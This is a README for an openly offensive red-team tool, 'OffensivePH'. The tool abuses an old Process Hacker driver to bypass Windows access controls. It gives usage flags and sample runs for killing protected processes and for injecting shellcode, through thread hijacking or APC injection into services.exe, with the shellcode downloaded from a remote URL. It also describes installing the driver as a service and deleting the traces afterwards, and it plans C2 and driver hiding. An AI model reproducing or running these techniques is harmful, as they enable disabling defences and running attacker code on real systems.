# offensiveph

OffensivePH is a post-exploitation tool that utilizes an old Process Hacker driver to bypass several user-mode access controls.

## Usage
- Compile OffensivePH with VS2019 (tested). 
- Execute with Admin privileges.
- offensiveph.exe: Standalone tool that can be used as a shellcode loader or process killer. 
- Hook2Kph.dll: a DLL that can be injected into your process to redirect several standard API calls to IOCTLs. Tools like sRDI can be used to convert Hook2Kph.dll into shellcode and inject your attacker process.    
- OffensivePH will extract the old Process Hacker driver from its resource section into the current directory with the name kph.sys and create a service to install driver. After execution service and file should be deleted automatically. 
```
offensivph.exe [-kill|-peb|-hijack|-apcinject] [<PID>] [<URL>]
	-kill		: Kill process (can kill PPLs)
	-peb		: Read PEB of a process
	-hijack		: Inject shellcode using thread execution hijacking
	-apcinject	: Inject shellcode into a new services.exe (WinTCB-PPL) instance
```
- Kill processes
```
> offensiveph.exe -kill 8228
# OffensivePH
-------------------------------------------------
[*] Driver path: C:\Users\RedSection\kph.sys
[*] Connected to KprocessHacker Driver
[*] Trying to terminate pid: 8228
[+] KphTerminateProcess is SUCCESSFUL
[*] Service and file are removed
```
- Inject shellcode by using Hijack Thread execution 
```
> offensiveph.exe -hijack 8412 http://192.168.56.100/calc-clean.bin
# OffensivePH
-------------------------------------------------
[*] Driver path: C:\Users\RedSection\kph.sys
[*] Connected to KprocessHacker Driver
[+] Connecting to URL for downloading payload
[+] Process 8412 thread is hijacked to execute payload
[*] Service and file are removed
```
- Inject shellcode into a new services.exe instance
```
> offensiveph.exe -apcinject http://192.168.56.100/calc-clean.bin
# OffensivePH
-------------------------------------------------
[*] Driver path: C:\Users\RedSection\kph.sys
[*] Connected to KprocessHacker Driver
[+] Process 652 token is duplicated as Impersonation Token!
[+] Connecting to URL for downloading payload
[+] Protected Shellcode Host Process: 6520
[*] Service and file are removed
```

## References
This repo contains lots of codes and inspration from original Process Hacker code. 
- https://github.com/processhacker/processhacker
- https://github.com/processhacker/phnt

## TODO
- Reflective DLLs and C2 implementation
- Hiding Kph Driver
